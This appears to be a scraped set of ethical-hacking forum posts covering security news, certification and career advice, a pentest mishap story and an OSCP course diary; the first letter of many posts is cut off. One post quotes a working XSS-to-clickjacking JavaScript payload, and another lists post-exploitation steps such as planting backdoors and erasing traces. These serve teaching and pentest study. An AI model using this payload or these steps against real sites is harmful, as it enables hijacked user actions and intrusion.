2;Howard A. Schmidt Named Chief of Cybersecurityongrats to our friend and best of luck. this has historically been a tough position to get real work done. we offer him our collective hand if called upon to do so. nearly seven months after highlighting the vulnerability of banking, energy and communications systems to internet attacks, the white house on tuesday is expected to name a technology industry veteran to coordinate competing efforts to improve the nation’s cybersecurity in both military and civilian life. the decision to appoint howard a. schmidt, an industry executive with government experience who served as a cybersecurity adviser in the bush administration and who also has a military and law enforcement background, is seen as a compromise between factions. government officials and industry executives say there has been a behind-the-scenes dispute over whether strict new regulations are necessary to protect the network that increasingly weaves together the vast majority of the world’s computers.  mr. schmidt will report to the national security council — not both to the council and to the national economic council, as previously planned, an administration official said on monday. mr. schmidt will also “have regular access to the president,” said the official, who spoke on the condition of anonymity because he had not been authorized to talk publicly about the appointment.  cybersecurity has taken on new urgency this year in the face of a growing range of cyberattacks and reports of vulnerabilities in business and military computing systems. indeed, at the may 29 announcement of his administration’s decision to create the position of cybersecurity coordinator, mr. obama described how during his presidential campaign computer intruders had “gained access to e-mails and a range of campaign files, from policy position papers to travel plans.” “it was,” he said, “a powerful reminder: in this information age, one of your greatest strengths — in our case, our ability to communicate to a wide range of supporters through the internet — could also be one of your greatest vulnerabilities.” after reviewing the nation’s cybersecurity preparedness, the white house said it would create the position of cybersecurity coordinator to harmonize the nation’s various efforts to “deter, prevent, detect and defend” against cyberattacks.  the administration’s decision to appoint mr. schmidt was slowed by a tug of war among political, military, intelligence and business interests, said people with direct knowledge of the selection process. industry officials, for example, have expressed concern that new regulations would dampen innovation.  in recent months the administration has been criticized by lawmakers and others for not moving more quickly to fill the position. experts on the issue had questioned how effective a cybercoordinator could be if forced to report to two governmental councils without direct access to the president. for complete story: http://www.nytimes.com/2009/12/22/techn ... .html?_r=1 do
2;Citibank Hacked for Millions... Or Was It?ccording to the wall street journal, u.s. authorities are investigating a computer-security breach targeting citigroup.inc. the hackers, who appear to be linked to a russian cyber gang, made away with tens of millions of dollars. its unknown whether the hackers gained direct access to citibanks systems or if they went through a third party, or if it even happened at all. despite reports to the contrary, citibank officals contend that no such breach occurred. "we had no breach of the system and there were no losses, no customer losses, no bank losses," said joe petro, managing director of citigroups security and investigative services. "any allegation that the fbi is working a case at citigroup involving tens of millions of losses is just not true."  the wall street journal claims the threat was initially detected by u.s. investigators who noted suspicious traffic from ips that had been used by the russian business network, which is a russian gang that has a history of selling hacking tools and software for accessing u.s. government systems. original story: http://www.maximumpc.com/article/maximu ... ibank_hack do

1;CISSP/Career Advice Neededello all:  i’m considering obtaining the cissp cert, and im trying to get ‘realistic’ advice concerning the opportunities/options that the cissp would provide me.  i’m 48 years old, and i’m asking for any (brutally honest) advice concerning the realistic options that i have for securing a career in i.t. security. (probably entry-level) (i’ve been with comcast for eight years/four of those on the senior-help desk) i currently have: associates (it) /network +/security +/certified ethical hacker (ceh) and some experience with the oscp. i found the oscp to be very challenging.  any thoughts/insight on the difficulty of cissp compared to the oscp or ceh? i’m experiencing a sense of ‘urgency’ in securing a career, and am open to any/all options. i’m willing to relocate/travel 100%/contract/etc. i’m looking into options such as: incident handler/loss prevention/management/ i’m willing to spend a year (self-study) to obtain a cert that will put me in the 50k to 70k range if you have any advice/resources/etc., i would certainly appreciate it.  thanks in advance,  michael         and yes, i really am an ex-circus musician (bass guitar
3;Thinking of starting out in comp security.. where to start?asically lately ive been thinking its high time i go make something of myself and in the last few months have been looking at studying a degree. however recently (thanks mainly to those responsible for taking down psn) ive been reintroduced to to the world of hacking and cybersecurity. i say reintroduced but i dont have much experience in it just a little bit of interest from 14-16 where i messed around with a few things. i do however have a small background in it support. anyway after being reintroduced ive spent a small bit of time going around looking at various different things and think ive probably found a perfect career choice. ive always been gifted with computers and had a knack for picking things up extremely quickly software side of things. from starting out in computers on a more advanced level at 14, i landed a full time job at 16 however burnt myself out after just a few months and became discouraged.  anyhow at 24 i feel its time to go back to what im not only good at, im passionate for. what always interested me with computers was a fixation for how software worked and really being able to sink my teeth into so many different aspects and feel rewarded with the knowledge i learnt. i have also had a fixation with more of the fairy tale type hackers from a young age however as ive matured that interest has also matured into the ramifications of such hacking and counter measures in dealing with it.  with this in mind ive done a little research and found a few places here in the uk that offer computer security degrees that im strongly considering. however while i have a small bit of knowledge of what is required for this profession, there is so much information to take in which seems a little overhwhelming to try and get a good overview. with this in mind i was hoping someone could possibly point me in the right direction hopefully in the form of a nice big book i can sink my teeth into. im generally just looking for a good overview of what computer security entails and what id be expected to learn and do on a daily basis so that i know if ive made the right choice or not to think about getting into it. any ideas or other advice? wow a bit of a rambling.. i assume most people here arent add sufferers but for those who are.. tldr version : good beginners books for a decent overview of what ethical hacking and cybersecurity entails
1;A cautionary tale for Penetration testers on live networksith many recent questions on “how do i exploit this?” or “if i do this on the network?” on the boards, this incident is worth thinking over before playing with a system or network that you don’t have written permission for. i got a call from a friend, whom we’ll call him dave, who was having some account lock out problems on his windows domain. he was a bit spooked as the accounts were service accounts for backup, monitoring and sql and they all locked out within minutes of each other. this stopped two major production systems in the middle of the working day and was causing him a stream of abusive phone calls on why “his” it systems weren’t working and what the heck was going on. given dave’s network was pretty well patched, they used a good account naming standards (so not accounts named backup, admin, etc) and every device had a decent av on it, his admin senses were warning him something hoaky was going on. i directed him to look on his domain controller for the account lock out event id’s 539. event id 539 has the machine name, which means you can trace back the machine causing the lock outs. the machine name came back as xp, which was odd as the company machines are named after their asset numbers for accounting purposes. pinging the machine’s name returned its ip address but no echo replies, so it appeared to be down. as i was asking questions, three more service accounts got locked out, all from workstation xp. on a hunch, i asked him to check his dchp server, look for the ip address there and tell me what the mac address was. he found it quickly and noted that it looked different from the dell machines mac address details. a quick look up on  http://www.coffer.com/mac_find/  confirmed with was a vmware machine. dave was somewhat disturbed by this as they are a windows only shop, including any virtualisation software. dave’s lan covers several floors and a large warehouse and has 16 switches, so we went with the old trick of searching the switches’ cam tables for the mac address to located which switch and port this ip address was connected to. as it happens the wiring diagrams were well maintained; the switch and offending port the mac address had been connected was down one flight of stairs. another three accounts locked out by the same machine name while we were doing this. a somewhat angry and confused dave popped down stairs to see what was going on.  a now very excited dave call back telling that a guy he’d never seen before was sitting at a spare desk, plugged in to the “evil” port, working on a shiny mac laptop. he was on the way down to the warehouse to gather up some of the bigger lads to act as back up when he confronted the intruder.  dave’s a big fan of the show 24, and imagination had got carried away with him. i told him to turn around, call his boss and check with reception if they knew this person was first. reception proved to be more helpful than his boss, who had no idea. the “nice young man”, according to the receptionist, was a guest of the chief finance officer. dave ran up the stairs to the top floor, burst in to the cfo’s office demanding to know who this guy was and why he was plugged in to dave’s network. the shocked then annoyed cfo stared at the wild-eyed, panting dave and calmly replied he was a consultant doing some testing highlighted in the last audit. dave, bravely attempted to not get himself fired on the spot, blurted out that consultant was the one who’d just stopped the inventory database critical to the warehouse operations. the cfo brain connected that this was something bad and, with dave following, rushed down to the consultant’s desk and order him to cease all activity. dave had all the accounts unlocked and all the services running again within the next hour. he was asked to sit in a meeting with the cfo, his boss, the consultant and the consultant’s boss. the angry cfo was demanding answers on what had happened. the two from the consultancy exchanged looks and hand over the penetration testing contract and scope of work. all signed and agreed by the cfo.  to cut a long and embarrassing (for the cfo) story short, new auditors had recommended a penetration test be carried out to assess the internal systems as it systems where now critical to the business. the cfo decided not to involve or inform anyone from it, against the penetration testing company’s objections, as he always dealt with these types of financial matters. he ordered an extensive testing program including password attacks, all to be carried out on site and during office hours. dave looked over the scope of work and was horrified what the cfo had chosen, the document clearly stated some of these tests carried risk, but had been signed off on. the outcome from this was  1)	the business  had a three hour outage in the middle of its working day when the consultant was in attacking mode by attempting password brute forcing on service accounts 2)	the business estimated losing half a million dollars during those three hours 3)	the two day pentest engagement was cancelled and a more sensible scope of work was drawn up 4)	it was included in on any and all audit requirements 5)	the cfo got his wrist slapped. draw what you will from this tale, but always, always have written permission from someone in the business authorized to give it before even think about pen-testing a system
1;Offensive security lab setups of right nowâ  you know that i am following toms book. i have created the virtual laba and what not. what i would like to do is imitate the lab setup that the offensive security(remote exploits course) lab students use so when i take that course i can be better prepared for it. if any one has taken that course it would be nice to hear from you on what type of oss they used in there labs that you attack. do they have winxp home or pro?  thanx sorry for so many posts. just trying to get all my ducks in a row
3;Sad story about what happens when you dont hire a pro..he more visibility their sites got -- being on the first page of a google search, for example -- the worse their bottom line became. being on top drew attacks from adware companies that stole customers away with pop-up ads as they were ready to buy. the more they fought back, the worse things became, drawing direct hacking incidents from the adware companies. though those companies have been sued out of existence by other victims, the presence of the infections in millions of computers continued to plague the martinez entrepreneurs and forced them off the internet. http://chronicle.augusta.com/news/busin ... l-touch?v= how about hiring a pro folks?  im not having pity on someone who called the fbi and expected them to handle a mass adware problem.  although the article lacks a number of technical details, im not into watching someone play the victim here.  dont assume that you can just jump on the internet with no technical background and be successful.  and if you run into problems, hire a pro. the route these two took is analogous to buying a house that later has leaky plumbing.  they call a priest (wrong profession) to look at the leak and when he cant handle it, they move out (at a loss) without ever having consulted a plumber
2;Critical Sun java exploit foundpparently there has been a serious java vulnerability discovered, which allows attackers to execute simple web-based attacks against people running current versions of windows. disabling the java plugin does not seem enough to prevent the problem, as the vulnerable toolkit is installed independently. if sun does not comply with the demand to release an early patch for this, the exploit will be thrown out into the open.  more:  http://blogs.zdnet.com/security/?p=6082 ... ntent;col
3;Hacking a pacemaker?thought this was a very interesting article on cnn: (cnn) -- nathanael paul likes the convenience of the insulin pump that regulates his diabetes. it communicates with other gadgets wirelessly and adjusts his blood sugar levels automatically. but, a few years ago, the computer scientist started to worry about the security of this setup. what if someone hacked into that system and sent his blood sugar levels plummeting? or skyrocketing? those scenarios could be fatal. "if your computer fails, no one dies," he said in a phone interview. "if your insulin pump fails, you have problems." as sci-fi as it sounds, pauls fears are founded in reality. researchers say it is possible for hackers to access and remotely control medical devices like insulin pumps, pacemakers and cardiac defibrillators, all of which emit wireless signals. in 2008, a coalition of researchers from the university of washington, harvard medical school and the university of massachusetts at amherst wrote that they remotely accessed a common cardiac defibrillator using easy-to-find radio and computer equipment. in a lab, the researchers used their wireless access to steal personal information from the device and to induce fatal heart rhythms by taking control of the system. read the full report from the researchers (pdf) in the two years since that finding, some computer scientists have been on a quest for security fixes for these potentially life-saving devices. pacemaker passwords paul, a research scientist with the oak ridge national laboratory in tennessee, is among them. hes mocking up a design for a more secure insulin pump that cuts some of the wireless connections between parts of the system. others are looking for security solutions for pacemakers and cardiac defibrillators, which are embedded inside a patient and can adjust his or her heart rhythms. at the computer-human interaction conference in atlanta, georgia, this week, tamara denning, a phd student at the university of washington, presented a number of prototypical security safeguards for pacemakers and defibrillators. view dennings full presentation (pdf) some of the suggestions would protect the devices with passwords. but that poses further complications, denning said, because doctors and nurses have to be able to control the devices in the event of an emergency, even if the patient who knows the password is unconscious. it may be possible to get around that issue by tattooing a barcode containing the password on the patients skin, either with visible ink or ink that can be seen only under ultraviolet light, she said. patients also could wear bracelets with their passwords on the inside, or doctors could carry devices that would de-activate a pacemaker or defibrillators security protections in the event of an emergency. denning said it will be important to standardize security measures. "if you have a patient thats unconscious on the ground, you really dont want the medical staff to have to figure out what security system theyre using," she said in the presentation. regulation some people are prodding the u.s. food and drug administration to further regulate these devices, perhaps requiring them to be more secure. in an april 1 article in the new england journal of medicine, dr. william maisel, an assistant professor at harvard medical school, wrote that the fda should lead an effort to develop appropriate legislation for the medical devices. the pacemakers and defibrillators are more open to attack as they become more sophisticated, he wrote. "medical devices have provided important health benefits for many patients, but their increasing number, automation, functionality, connectivity and remote-communication capabilities augment their security vulnerabilities," he wrote. he added: "the security of medical devices is not a luxury." the fda would not provide a comment to cnn on this matter. wendy dougherty, spokeswoman for medtronic inc., a large maker of implantable medical devices, said the company is willing to work with the fda to establish "formal device security guidelines." the company is aware of potential security risks to implanted medical devices, she said. "safety is an integral part of our design and quality process. were constantly evolving and improving our technologies." in a written statement, dougherty described the risk of someone hacking into a wireless medical device as "extremely low." wireless connections the security concerns stem from the fact that pacemakers, defibrillators and insulin pumps emit wireless signals, somewhat like computers. these signals vary in range and openness. researchers who reported hacking into a defibrillator said some in-the-body devices have a wireless range of about 15 feet. many devices do not have encrypted signals to ward off attack, the researchers say. encryption is a type of signal scrambling that is, for example, employed on many home wi-fi routers to prevent unknown people from accessing the network. researchers urged people who use wireless medical devices not to panic. while security threats to medical devices theoretically exist, there have been no documented cases of wireless attacks on medical devices, the researchers said in papers and interviews. the real concern will come when these devices are further connected -- to phones, the internet and other computers, said kevin fu, an assistant professor of computer science at the university of massachusetts at amherst. "today, there should be no reason for concern," he said. "if i were prescribed a device by a doctor, i would certainly take it. the concern about the security of the devices is for the future." motive theres some question as to why a person would hack into a pacemaker or insulin pump and how the hacker would know a person uses a medical device. maisel listed some possible scenarios in his new england journal article. "motivation for such actions might include the acquisition of private information for financial gain or competitive advantage; damage to a device manufacturers reputation; sabotage by a disgruntled employee, dissatisfied customer or terrorist to inflict financial or personal injury; or simply the satisfaction of the attackers ego," he wrote. denning, from the university of washington, said the current risk of attack is very low, but that someone could hack into a pacemaker without apparent motive. she referenced a case from 2008 in which a hacker reportedly tried to induce seizures in epilepsy patients by putting rapidly flashing images on an online forum run by the epilepsy foundation. convenience paul, the diabetic who is concerned about his insulin pump, said researchers face many challenges in making medical devices more secure. patients dont want to have to enter passwords constantly or adopt security measures that would make daily tasks inconvenient, he said. but with cooperation and increased awareness, he said the security gap can be closed. "its definitely a problem, but the good thing is we have people looking at this problem now and i think we should start seeing some good solutions soon," he said. http://www.cnn.com/2010/tech/04/16/medical.device.security/index.html?hpt=c

3;Jarlsberg By Googlettp://jarlsberg.appspot.com/ this codelab is built around jarlsberg /yärlz·bərg/,  a small, cheesy web application that allows its users to publish snippets of text and store assorted files. "unfortunately," jarlsberg has multiple security bugs ranging from cross-site scripting and cross-site request forgery, to information disclosure, denial of service, and remote code execution. the goal of this codelab is to guide you through discovering some of these bugs and learning ways to fix them both in jarlsberg and in general. the codelab is organized by types of vulnerabilities. in each section, youll find a brief description of a vulnerability and a task to find an instance of that vulnerability in jarlsberg. your job is to play the role of a malicious hacker and find and exploit the security bugs. in this codelab, youll use both black-box hacking and white-box hacking. in black box hacking, you try to find security bugs by experimenting with the application and manipulating input fields and url parameters, trying to cause application errors, and looking at the http requests and responses to guess server behavior. you do not have access to the source code, although understanding how to view source and being able to view http headers (as you can in chrome or livehttpheaders for firefox) is valuable. using a web proxy like burp or webscarab may be helpful in creating or modifying requests. in white-box hacking, you have access to the source code and can use automated or manual analysis to identify bugs. you can treat jarlsberg as if its open source: you can read through the source code to try to find bugs. jarlsberg is written in python, so some familiarity with python can be helpful. however, the security vulnerabilities covered are not python-specific and you can do most of the lab without even looking at the code. you can run a local instance of jarlsberg to assist in your hacking: for example, you can create an administrator account on your local instance to learn how administrative features work and then apply that knowledge to the instance you want to hack. security researchers use both hacking techniques, often in combination, in real life
3;VMware or VirtualBox?was wondering which one you use in your lab. i used to have vmware server, workstation and player in my lab, but a few months ago, i installed virtualbox and i find it quite easy to use. so far, i didnt get any problem. because i am definitively not an expert on virtual machines, would you guys see any limitation with virtualbox
3;Please help me decide...m interested in the oscp class, but i have a concern about my current abilities. ive done pen tests for the company that i work for now, and i understand the basics of metasploit, nmap, nessus, etc., but ive been reading comparisons between this course and elearnsecuritys course. elearnsecurity states that their course is designed for 0 - 3 years of experience and it seems to be the recommended before doing oscp. i dont pen test on a daily basis, so i dont know how much relevant and practical experience in "years" that i really do have. i dont know asm (im reading up on it now), i have the basics of python (written a few scripts from scratch), i dont know ruby, and i know a little c/c++ but have never written an exploit. ive used bt off and on since bt3, but nothing major. i guess i need to know if im a good candidate for the course. i dont want to get in over my head
1;Forum gets hacked every few monthso being a contributing member on here for the past yr or so i am hoping you can help me out with another hobby of mine.  i am a moderator on a local car website called coloradoevo.com.  my friend owns the site and we have about 400 members.  we all have the similar car mitusbishi evos (mine is a 750 hp and recently put into a magazine, toot me own horn). every few months the site gets hacked by i think a previous member that was booted off the site.  he said he has hacked into it before and feel he still has a grudge. the site is using a version of vb that is not widly used as it has many problems and weak security built in. as a recently graduate with limited experience what can i provide by helping my friend not only protect the site from further attacks but find the problem and possibly the source.   yes i know the person could be using a proxy therefore never being able to find him but is there anything else. maybe the person got lazy this time and didnt use a proxy. if we were to find the person could i get in contact with the fbi and have them look into it
1;I have a shell. Now what?ey, while doing a pentest for a client, once we get a bind or a reverse shell on a machine, what should we do and in what order?  escalade privileges install useful tools (backdoor, tunnels, etc) enumerate users start cracking passwords to help gain access to other machines erase traces look for interesting files containing database login credentials, sensitive data, etc scan other machines from this host use it as a pivot to attack internal networks but what else do you do once you own a box
3;Does Google Have a Double Standard on Full Disclosure?ow here is an interesting development  tavis ormandy has set the cat among the “responsible disclosure” pigeons with the release of technical details of a zero-day vulnerability affecting the microsoft windows help and support center without giving microsoft adequate time to prepare a patch. see, here’s the big problem. either you are all about full disclosure (which is happening less and less these days), you use it only when you know the company won’t react otherwise or has all kinds of other hinky things they do behind your back (the same reason i advocate full disclosure against google), or you use responsible disclosure.  google says it adheres to responsible disclosure, but at the same time they give microsoft 5 days to fix their 0day that google’s researchers themselves created!   http://threatpost.com/en_us/blogs/does-google-have-double-standard-full-disclosure-061010?utm_source=threatpost&utm_medium=tabs&utm_campaign=today%27s+most+popula
3;Turning XSS into Clickjackingnteresting read  those of us who do a lot of work in the security world have come to realize that there is a ton of cross site scripting (xss) out there. 80% of dynamic sites (or more) suffer from it. but how many sites allow you to do html file uploads comparatively? it’s a much smaller amount, and typically requires some sort of login before you’re allowed to do it. often times it’s protected by login too, so it’s a relatively small amount of people who could be impacted by any sort of html file upload. but that is precisely what’s needed to mount a clickjacking attack (usually one or two pages). either the attacker has to rent space in the cloud with a stolen credit card, or find some parasitic hosting somewhere. that’s when i got to thinking… how can you use any old generic reflected xss attack to mount a clickjacking attack? a few hours later i had a prototype that worked. here’s how the attack would work. let’s say a parameter like “search” was vulnerable to reflected xss. an attacker could do something like:      http://example.com/?search= <script>eval(location.hash.slice(1))</script> this is an old trick that basically says anything that falls into the anchor tag is what the attacker wants to run as the attack. anchor tags are not sent to the server, they are only seen on the client. so this effectively turns the reflected xss into a dom based xss, which leaves less of a signature on the server as well, incidentally. then the attacker’s anchor payload would look something like this (this works only in firefox): http://example.com/?search= <script>eval(location.hash.slice(1))</script>#a=document.body.appendchild(document.createelement("iframe"));a.d=a.contentdocument;a.d.open().close();i=a.d.createelement("iframe");a.style.width=90;a.style.height=90;a.style.border=i.style.border=0;a.style.position=i.style.position="absolute";a.style.overflow=i.style.overflow="hidden";a.style.opacity=.3;i.style.width=100;i.style.height=100;i.style.left=-10;i.style.top=-10;i.src="http://www.victim.com/";a.d.body.appendchild(i);function followmouse(e){xcoord=ycoord=40;xcoord+=e.pagex-50;ycoord+=e.pagey-50;a.style.left=xcoord;a.style.top=ycoord;}document.onmousemove=followmouse; so you have a reflected xss on example.com that instantiates a dom based xss which instantiates a clickjacking attack against victim.com. obviously you’d need to modify this to actually fit the right coordinates and work in other browsers, but this could easily be used to leverage the attack in situations where an attacker might not be able to otherwise. for instance, if the clickjacking defenses only care about the referrer and the referrer is on the correct domain just a different sub-domain, that could be used to bypass it - and so on. anyway, i thought some people might think this is interesting. happy penetration testing! http://ha.ckers.org/blog/20100614/turning-xss-into-clickjacking
3;What is your role in this fieldm curious to know what is the purpose for many here in studying slash certifying slash learning "ethical hacking" are you involved for the challenge, for the fame, for the money. what possessed you and now possesses some of you to continue on the road to ethical binary destruction? (hacking) personally, i like the challenges involved in learning something new everyday. ive been involved now professionally for who knows how many years, 14 or so plus on the security side, computing since the days of my adam w/smart basic. there are so many arenas in security (penetration testing, firewalls, networking, cryptography, programming, etc.) i sometimes feel like a kid in a candy store. cert-wise within the past 4-5 years, i started ramping up on certs not because i really care for them, but because of the market. certifying is a dual edged sword. some of the smartest people i know have zero certs. yet some of the lamest (for lack of better terms) have the highest paying jobs because they certified. right now, i just like the challenge and have started looking at the certification process as another hack. id like to be able to learn enough to earn as many security related certs for the sake of saying: "another challenge down" yet at the same time much of the content bores me at times... e.g., i just took the cism this past weekend and finished in an hour and five minutes. this is the second time taking the exam and the first time i failed by two points (scaled scoring). the first time, same results, i finished in about an hour twenty minutes and had to run to catch a plan. no studies, etc., this time i swore i would study and take my time... i did not study but i did take my time... i even spent another 40 minutes going back over my answers but quickly got bored... so there you have it... personally i do it for the challenge... why do you do it? (by the way, my focus for the year is scattered... crea + juniper certs + cisa*maybe* + isrm coming up
0;OSCP Walkthroughk, here goes nothing... when i became one of the lucky winners of the eh.net offensive security prize giveaway i got the feeling i had to do something in return. lets start with a big thank you to donald who made all this possible: thank you. when i decided to write down my experiences with this course i created a new file on my desktop and paused to think of an appropriate name. since i did not wanted to write just another review, but provide something extra, i hesitated after i typed pwb review. due to the fact that i want it to be more then a review, i had to come up with a different name. the first option that came to mind was pwb blog, cause i tend to write short pieces throughout the course to take you all in on the journey that lays ahead of me, but i did not find it the right term to use. it came to mind when i thought of my earlier days when i had the time to play video games (all good things come to an end). i remember playing games like resident evil with a stack of printed papers next to me, telling me what to do at a certain point in the game. these documents are called walkthroughs. now dont get me wrong, i will not help you pass this course or tell you detailed inside information about the course/exam itself, but i will tell you how i got from the point of deciding to take the course, to the point of getting back my results from the test, which are hopefully high enough to pass  . before you continue reading, i want to state that this walkthrough is published as is. sometimes i will look back and change a few words or so, but i hope that in the end i will have a representative version that can truly add something to the existing information that is already at hand. i also hope i will continue to have the time to update it and keep everybody interested during the process and in the final result. please keep in mind that this is my first encounter with writing something (hopefully) worth publishing in any form, so any comment is welcome and appreciated! before starting: first lets start with the big question if you are ready to start with this course. the course is not your average certification or exam you might have taken before. the experience i have is with both self study and courses, but i knew from the start that this will not help me with this course. my current knowledge is based on my isc2 associate certification and my ceh certification. since i did the "isc2 associate" exam by self study i can only compare it with the actual exam. this consist as you may know of 250 multiple choice questions which you have to complete within 6 hours, and score more then 70% to pass. ceh is exam wise not much different: 150 multiple choise in 4 hours and also a score of 70% or higher to pass. the 6 day course i took for ceh consisted of many theoretical information with some time to play with tools on the side to get a feeling how these techniques are applied in the real world. ceh really puts you in the ethical hacker thinking mode. now most certificates are this way, but i knew from the start pwb is completely different. i think the pwb course is perfect if you think you have enough theoretical knowledge about ethical hacking, and want to turn this into practical experience! general info: the approach for this course used by offensive security is that learning for this certificate will be "hands on" as much as possible. this makes it perfect for people that already have some experience or obtained some sorf of certification in the penetration testing field. this also makes pwb less suitable for people that don not already have experience or some other, more theoretical certificate in this field. the study material consists of a syllabus that is used to guide you through the required learning material, which is backed up by videos that can be downloaded from their virtual lab. yes, you also get access through a vpn to a virtual lab where you can immediately try out your freshly obtained hacking skills. there are multiple vulnerable systems with different operating systems that are hooked together within multiple infrastructures. this gives you a big playground to poke around in without doing any harm. the exam will also be held in your virtual lab. your objective is to break in an extra secured part of the network and gain access to the main computer. after this you will, just like in real life, report your findings in a penetration report that will represent your exam. this will be scored on several points like succes, documentation and completion. there is also another factor to make it more interesting: time! the penetration test must be finished within 24 hours. after this you get another 24 hours to finish up your report instead of sending in just loose notes. if you succeed you may add the oscp (offensive security certified professional)title to your name. this wraps up about all there is to know about the course itself. so what is the first step to become an oscp? thats right, registering! registration: registering was a little different because of the "me winning the course" element. but some parts are the same for you if you decide to start the course. first you register through the website with a valid, non free email address so the people at offsec can validate your identity and do some background checks if needed. i received a mail that my isp email address was not sufficient, and they needed another email address to complete my registration. if this fails, so i was told by the email, they would required a scanned copy of my id. the second email i provided seems sufficient to prove my identity so we are ready for the next step. after this you receive an email with credentials to a test account where you can test you connectivity to the vpn server. there is a link provided to a connectivity guide if you dont know how to test it. here you can also get a copy of backtrack that is tweaked for the course. since i received this email fridays after worktime on my work address, i missed the 48h window where the account needs to be tested in. after sending an email explaining my situation i was supported nicely by one of the offsec employees by extending my test credentials for another 24. i received an email back within a working day, so the help service at offsec is good. when you tested the connection to the vpn server you can continue with registering for the course. the advice here is to have a decent computer (you will probably run the backtrack image you downloaded in vmware or virtualbox, so make sure you have sufficient memory and processing power) and internet connection (since you will be downloading some videos). after supplying the neccesary details you get to choose your payment options, which consists of either paypal or master/visa. since i had a voucher code i dont have any experience with the actual payment proces, so you are on your own on this one. after payment you receive a mail that registration was succesful and you will receive another mail with credentials when the course starts. on to the course! first impressions: after receiving the confirmation mail on the starting day of the course, which by the way was nice on time, i logged in to the vpn with the credentials provided. the first thing i noticed was the presence of a webbased "dashboard" functionality which provides a nice overview of your personal information. it gives a heads up on the status of the systems available, and the possibility to reset any changes you made on the host servers if you happen to break them. it also lets you control the windows xp rig that you may use to test things locally. here you have the option to reset the password, or completely reset the system if you wrecked it beyond repair. giving on the list of servers you can reset in the dashboard, there are about 20 servers that can be exploited. no additional information is displayed, but that is ofcourse the challenge of the course. another neat function is the posibility to see how your progress is doing. the network is divided into 4 different lans. you already have access to the first one, but the objective is ofcourse to get access to all of them. if you hack specific servers in a particular network you can download md5 hashes which can be used to update the status in your dashboard. there is also a hash brute forcer at hand on one of the servers, so you can use that if you are in need of some computing power. after seeing the dashboard and the servers that are available my first impression was: this network is huge! at first it is hard to get a good overview of the entire vpn, but after a while you get a pretty clear picture of the complete network at hand. so much to play with, so little time... exercises: after finishing the first 5 modules it is time to post my first impressions about the exercises. at this point i have not played in the lab much because of the nature of the first modules. as many of you might know, the first modules teach you some backtrack basic bash/shell scripting, information gathering techniques and port scanning. the list of modules can be downloaded from the offensive security website, so i suggest you have a look at it to see what you can expect from the topics addressed if you are interested. you can either follow the course guide provided, or let the lab videos guide you through, just remember that they complete eachother, so dont just go blind with one or the other. another trap is wanting to go too fast. i for example thought after the first portscans it would be a walk in the park and soon found myself trying all kinds of attacks (which got me nowhere cause they were either too simple, too difficult or not in scope at all) without even looking at the course material. this might work if you are lucky, but it is not the intention of the course. the first module teaches some basic shell scripting while getting familiar with the virtual lab. from this point on i knew that my weak point (wait...lets stick with complete lack of) of programming/scripting skills would come back to haunt me. no less it took me just a little bit longer then the average person to complete the exercises (i think), but those credits go to muts for doing a hell of a job explaining things and taking you step by step through example exercises. at some point i found myself stuck in a part i didnt have any prior knowledge about, and the help forums came up with just the right pointers to get me going again. there are tons of information there you can use with the exercises, so if you cannot make it on your own, there is enough information available to keep you going. despite my lack of programming/scripting knowledge, i find the exercises fun to do. i cannot wait to get started with the real lab exercises and to start hacking away on all those victims just sitting there waiting for me to come along. i wonder how much knowledge and time is needed to, as i phrase from pokemon: gotta catch em all! another great part of the course is that you are forced to document your findings within the labs carefully because every piece of information is needed for your pentest report. this gives you a great overview and in depth knowledge about the network at hand. i generally like the way the course is put together and the way you are escorted through the modules. this gives you a confident feeling and makes you think you can hack the planet! (but lets stick with the lab for now). i finished all the modules that are covered in the videos and skipped in a fast pace through the last ones in the lab guide. some topics were complete new for me like arp spoofing, buffer overflows and client side attacks. thanks to the good and simple explanation that takes you step by step through the process i managed to get through them with succes. the further i got in the course, the more i was amazed of the knowledge that the course comprehends (and i lack).ou â i want to give massive kudos to the offensive security team for this course. you know you are watching/learning from true professionals when they master the difficulty of the art, but make it look easy. this is exactly what they do. after finishing the modules i started to review the information gathered about the labs you collect through the exercises. the reconnaissance part gives you heaps of info about the targets in the labs, but found out quick enough that i had to start documenting properly. i started with putting all the important information i gathered in the sample test report you receive at the start of the course. this helps in getting that overview of the target and lets you set that aim for your first targets. i tried to spend a full day in the week on this course doing exercises and practicing, and an hour a day to read/watch the material. at this point i am halfway through the 60 days i have, so i recommend everybody to take the 60 day course. now we got that out of the way it is time for the interesting part: the lab machines! at this point i only spend a few hours in the lab, which comes to about the 24h you need for the exam. at this point i targeted about three machines. results? nothing! remember that feeling i talked about earlier that you can hack the planet? this gets shot into a thousand pieces when you actually start on the lab. at first this got (and still does a little) me really frustrated and insecure about my freshly aquired knowledge, but then again, if it would be a walk in the park everybody would be oscp certified. at this point i can identify most of the vulnerabilities that the machines have, and theoretically explain how to exploit them, but when i try the exploits that are discussed in the material in practice i always seem to find a little twist that makes it not work the way it supposed to. the frustration feeling i got with this experience quickly turned into motivation to try harder and get as far as possible in the labs. i got this feeling that once you have hacked your first one, the next few will come within no time, and guess what: i was right! after spending another few hours in the lab i managed to get into a few machines! i see that the difficulty of the machines varies from 1 click hacks to almost impossible. all i can think of now is that this is more challenging and most important, more fun then i could imagine! this is like playing around in the biggest playground there is, and get certified at the same time. once you have experienced this you will never want to take a normal certification course again! hacking along and preparing for certification ok, my labtime is officially over. i managed to get into about 60% of the hosts which leaves me with an unsatisfying feeling. if i knew the lab was going to be this big and hard i would have stared way earlier then i did now. i spend the first half working through the material which i could combine with playing around in the lab, but didnt. i suggest to start immediately if you want to get into the other subnets and make sure you get at least the 60 day course. the skill level of the lab differs from click and hack to complete manual procedures which makes it a pleasant environment to play in for everyone. you are certain to find a challenge regarding of the skill level you have prior to the course. this brings me to one of the most burning questions at the moment: how hard is oscp and is it suitable for beginners? i would say no. if you have no prior knowledge in pentesting/ethical hacking this will knock you down and leave you in the gutter. unless you have aquired the techniques of hacking and know how to penetrate systems you will have a very difficult time to gain the knowledge required to do well in the labs. im not saying its wasted time, because you will learn (a lot!) and you have sufficient time, you probably will have a decent chance to pass. i found it hard to find time because of my new job which kept me pretty busy and i guess you will have occupations too, so keep that in mind. compared to ceh, wait...what is there to compare? i thought about this a long time but i cant seem to find any similarities between the two courses. the only way to describe it is as followed: ceh: start talking it. oscp. start doing it!  at this point i am working on my report that you will need to hand in once the exam is finished. i am describing all the hacks i made within the labs and the exercises i made during the course. remember to make it as complete as possible to make it look just as a real pentest report. i planned my exam somewhere next month, this give me some time to go over the material again and to put in some work on some of the extra mile challenges to make sure i completely understand all the techniques mentioned. i have no idea what to expect, but i am preparing for hell! wish me luck! last update before the exam: this is my last update before i will take the exam this weekend. 